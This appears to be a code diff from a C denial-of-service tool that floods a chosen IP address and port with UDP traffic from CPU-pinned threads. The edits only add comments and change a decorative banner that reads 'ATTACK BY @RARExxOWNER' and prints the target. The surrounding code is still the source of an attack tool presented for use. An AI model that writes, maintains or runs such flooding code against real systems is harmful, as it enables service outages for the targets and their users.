@@ -52,8 +52,8 @@ void *send_udp_traffic(void *arg) {
     int sent_bytes;
     cpu_set_t cpuset;
     
-    CPU_ZERO(&cpuset);
-    CPU_SET(sched_getcpu(), &cpuset);
+    CPU_ZERO(&cpuset);  // Initialize CPU set
+    CPU_SET(sched_getcpu(), &cpuset);  // Set current CPU
     if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
         perror("❌ Thread CPU affinity failed");
         pthread_exit(NULL);
@@ -128,7 +128,7 @@ void signal_handler(int signum) {
 }
 
 void display_attack_start() {
-    printf("\n✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦\n");
+    printf("\n✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋅⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦✦•┈๑⋯ ⋯⋅๑┈•✦\n");
     printf("🌊🌊🌊 ATTACK BY @RARExxOWNER 🌊🌊🌊\n");
     printf("🎯 TARGETING IP: %s\n", ip);
     printf("📍 TARGET PORT: %d\n", port);
